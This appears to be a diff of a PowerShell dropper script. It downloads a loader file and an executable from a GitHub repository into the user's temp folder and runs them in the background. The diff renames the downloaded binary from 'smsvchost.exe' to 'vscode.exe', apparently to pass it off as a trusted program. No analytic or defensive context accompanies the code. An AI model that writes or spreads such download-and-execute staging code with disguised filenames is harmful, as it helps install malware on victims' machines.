@@ -17,8 +17,8 @@ try {
     Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath
 
     # Download smsvchost.exe
-    $smsvchostUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/smsvchost.exe"
-    $smsvchostPath = "$env:TEMP\smsvchost.exe"
+    $smsvchostUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/vscode.exe"
+    $smsvchostPath = "$env:TEMP\vscode.exe"
     Invoke-WebRequest -Uri $smsvchostUrl -OutFile $smsvchostPath
 
     # Run smsvchost.exe with loader.bin as an argument in the background
